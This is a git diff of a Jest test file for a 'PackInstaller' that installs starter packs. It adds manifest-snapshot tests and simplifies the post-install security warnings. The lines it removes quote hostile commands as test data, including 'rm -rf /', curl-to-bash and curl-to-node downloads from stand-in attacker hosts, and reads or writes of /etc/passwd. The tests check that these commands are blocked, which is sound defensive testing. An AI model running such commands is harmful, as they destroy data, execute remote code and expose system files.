@@ -161,6 +161,19 @@ describe("PackInstaller", () => {
       expect(manifest.packs["test-pack"].version).toBe("1.0.0");
     });
 
+    it("should save manifest snapshot after installation", async () => {
+      const result = await installer.installPack(mockValidPack, packSource);
+
+      expect(result.success).toBe(true);
+      
+      // Verify manifest snapshot was saved
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`)).toBe(true);
+      const snapshot = JSON.parse(await fs.readFile(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`, 'utf-8') as string);
+      expect(snapshot.name).toBe("test-pack");
+      expect(snapshot.version).toBe("1.0.0");
+      expect(snapshot.components).toEqual(mockValidPack.manifest.components);
+    });
+
     it("should handle installation errors gracefully", async () => {
       const invalidPack: PackStructure = {
         ...mockValidPack,
@@ -213,6 +226,9 @@ describe("PackInstaller", () => {
       const manifestContent = await fs.readFile(`${mockProjectRoot}/.zcc/packs.json`, 'utf-8') as string;
       const manifest = JSON.parse(manifestContent);
       expect(manifest.packs["test-pack"]).toBeUndefined();
+
+      // Verify manifest snapshot was removed
+      expect(await fs.exists(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`)).toBe(false);
     });
 
     it("should handle pack uninstallation when manifest source is unavailable", async () => {
@@ -221,7 +237,24 @@ describe("PackInstaller", () => {
 
       const result = await installer.uninstallPack("test-pack");
 
-      // Should still succeed but use fallback scanning approach
+      // Should still succeed using manifest snapshot (new behavior)
+      expect(result.success).toBe(true);
+      expect(result.installed.modes).toContain("engineer");
+      expect(result.installed.workflows).toContain("review");
+      expect(result.installed.agents).toContain("claude-code-research");
+      
+      // Components should be removed precisely using snapshot
+      expect(result.skipped.modes.length + result.skipped.workflows.length + result.skipped.agents.length).toBe(0);
+    });
+
+    it("should use fallback scanning when both manifest snapshot and source are unavailable", async () => {
+      // Remove both the manifest snapshot and the original source
+      await fs.unlink('/test/templates/starter-packs/test-pack/manifest.json');
+      await fs.unlink(`${mockProjectRoot}/.zcc/packs/test-pack.manifest.json`);
+
+      const result = await installer.uninstallPack("test-pack");
+
+      // Should use fallback scanning approach
       expect(result.success).toBe(false); // False due to scanning mode error message
       expect(result.errors.some(error => 
         error.includes("Pack manifest not available")
@@ -427,15 +460,8 @@ describe("PackInstaller", () => {
       // Should complete successfully but with security warnings
       expect(result.success).toBe(true);
       
-      // Verify security warnings were logged
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  SECURITY: Post-install commands detected but disabled for security');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Post-install commands could allow arbitrary code execution from untrusted sources');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Found commands in manifest but they will NOT be executed:');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - rm -rf /');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - curl malicious.com/evil.sh | bash');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'malicious\' > /etc/passwd');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  If you trust this pack and need these commands, run them manually');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️  Never run commands from untrusted starter packs');
+      // Verify security warning was logged (simplified)
+      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');
 
       // Verify no actual command execution occurred (system would still be intact)
       // This is tested implicitly by the test suite still running
@@ -495,10 +521,8 @@ describe("PackInstaller", () => {
 
       expect(result.success).toBe(true);
       
-      // Verify all malicious commands were logged but not executed
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - echo \'normal\' && rm -rf /');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - npm install; curl attacker.com/backdoor.js | node');
-      expect(warnSpy).toHaveBeenCalledWith('⚠️    - ; cat /etc/passwd; echo \'done\'');
+      // Verify security warning was logged (commands are not shown in non-verbose mode)
+      expect(warnSpy).toHaveBeenCalledWith('Security: Post-install commands disabled (use --verbose for details)');
     });
   });
 });
